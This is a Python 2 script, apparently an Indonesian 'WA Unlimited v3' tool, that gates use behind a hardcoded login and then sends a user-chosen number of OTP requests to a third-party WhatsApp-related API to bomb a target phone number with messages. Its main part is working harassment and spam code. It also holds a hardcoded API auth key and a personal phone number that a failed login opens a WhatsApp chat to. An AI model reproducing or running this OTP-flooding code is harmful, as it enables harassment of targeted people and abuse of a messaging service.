import os, sys
print '\x1b[1;32mMasukan ID: Borot dan Password: indoxploit untuk Login dan jangan lupa login facebook di OperaMini dulu sebelum login agar tidak CekPoint'
print '\x1b[1;32mSilahkan Login '
import os, sys

def wa():
    os.system('xdg-open https://api.whatsapp.com/send?phone=+6285647761959&text=Assalamualaikum')


def restart():
    ngulang = sys.executable
    os.execl(ngulang, ngulang, *sys.argv)


user = raw_input('ID: ')
import getpass
sandi = raw_input('Password: ')
if sandi == 'indoxploit' and user == 'Borot':
    print 'Anda Telah Login'
    sys.exit
else:
    print 'Login GAGAL, Silahkan hubungi ADMIN'
    wa()
    restart()
import os, sys, time, datetime, random, hashlib, re, threading, json, getpass, urllib
from multiprocessing.pool import ThreadPool
try:
    import mechanize
except ImportError:
    os.system('pip2 install mechanize')
else:
    try:
        import requests
    except ImportError:
        os.system('pip2 install requests')

from requests.exceptions import ConnectionError
from mechanize import Browser
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]

def keluar():
    print '\x1b[1;91m[!] Keluar'
    os.sys.exit()


def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.1)

import requests, os, sys, json
hi = '\033[0;32m'
pu = '\033[0;37m'
me = '\033[0;31m'
ku = '\033[0;33m'
try:
 os.system("clear")
 print """%s
 __        __    _   _       _ ___     _______ 
 \ \      / /_ _| | | |_ __ | (_) \   / /___ /  %sAuthor MR.L4M3R%s 
  \ \ /\ / / _` | | | | '_ \| | |\ \ / /  |_ \  %sGithub github.com/MR.L4M3R%s
   \ V  V / (_| | |_| | | | | | | \ V /  ___) | %sTeam SUMBER CYBER TEAM%s
    \_/\_/ \__,_|\___/|_| |_|_|_|  \_/  |____/  %sWa Unlimited v3
                                               """%(hi,pu,hi,pu,hi,pu,hi,hi)
 no = raw_input("%s[%s?%s] %sMasukkan nomor target (ex:881xx) : "%(pu,ku,pu,pu))
 jum = int(raw_input("%s[%s?%s] %sMasukkan jumlah spam : "%(pu,ku,pu,pu)))
 ee = 1
 for sop in range(jum):
   dat=json.dumps({"number":"+62"+no,"auth_key":"B33FR33OTP"})
   tes = requests.post("https://api.klikwa.net/v1/number/sendotp",headers={'user-agent':'Mozilla/5.0 (Linux; Android 9; vivo 1902) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36'},data=dat)
   if json.loads(tes.text)["message"] == 'OTP Sent':
    print "%s[%s%s%s] %sSukses, spam to %s%s"%(pu,ku,ee,pu,pu,ku,no)
    ee += 1
   else:
    print "%s[%s%s%s] %sGagal, spam to %s%s"%(pu,ku,ee,pu,pu,ku,no)
    ee += 1
except KeyboardInterrupt: print "%s[%s!%s] %sExit"%(pu,ku,pu,pu)
except requests.exceptions.ConnectionError: print "%s[%s!%s] %sConnection Error"%(pu,ku,pu,me)
